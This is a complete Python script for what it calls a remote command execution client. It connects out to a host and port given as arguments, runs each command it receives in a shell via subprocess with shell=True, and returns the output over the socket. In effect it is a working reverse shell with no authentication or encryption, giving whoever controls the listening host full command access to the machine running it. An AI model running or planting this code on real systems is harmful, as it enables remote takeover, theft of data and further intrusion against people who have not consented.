import socket
import subprocess
import os
import sys

class Client:
    """
    Represents a client for remote command execution.
    """

    def __init__(self, host_ip: str, host_port: str):
        self.host_ip = host_ip
        self.host_port = host_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ACK = "ACK"

    def connect(self):
        """
        Connects to the server.
        """

        print(f'[+] Connecting to {self.host_ip}.')
        self.sock.connect((self.host_ip, self.host_port))
        print(f'[+] Connected to {self.host_ip}.') 

    def process_message(self, msg: str):
        """
        Processes the incoming message and sends the response to the server.
        """

        print(f'[+] Message received - {msg}')
        if msg.split(" ")[0] == 'cd':
            self.change_directory(msg)
        else:
            self.execute_command(msg)

    def change_directory(self, msg: str):
        """
        Changes the current directory.
        """

        try:
            directory = str(msg.split(' ')[1])
            directory = os.path.expanduser(directory)
            os.chdir(directory)
            cur_dir = os.getcwd()
            print(f'[+] Changed to {cur_dir}')
            self.sock.send(cur_dir.encode())
            print(f'[+] Sent new directory path to server - {cur_dir}')
        except IndexError:
            print('[-] No directory specified.')
            self.sock.send(b'Error: no directory specified')

    def execute_command(self, msg: str):
        """
        Executes the command in the shell and sends the output to the server.
        """

        command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = command.stdout.read() + command.stderr.read()
        self.sock.send(output)
        print(f'[+] Sent command output to server - {output.decode()}')

    def wait_for_ack(self) -> bool:
        """
        Waits for an ACK from the server.
        """

        print('[+] Awaiting ACK from server.....')
        ack = self.sock.recv(1024).decode()
        if ack != self.ACK:
            print("[-] An error occurred: no ACK received from the server")
            return False
        print('[+] ACK received from server.')
        return True
    
    def run(self):
        """
        Main loop for receiving messages and processing them.
        """

        self.connect()

        try:
            while True:
                print('[+] Awaiting reponse.....')
                msg = self.sock.recv(1024).decode()

                if not msg or msg.lower() == 'exit':  # Client disconnected or server terminated the session
                    break

                self.process_message(msg)

                if not self.wait_for_ack():
                    break

        except KeyboardInterrupt:
            print("[+] Keyboard interrupt issued.")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            self.sock.close()

if __name__ == '__main__':
    HOST_IP = sys.argv[1]
    HOST_PORT = int(sys.argv[2])
    client = Client(HOST_IP, HOST_PORT)
    client.run()
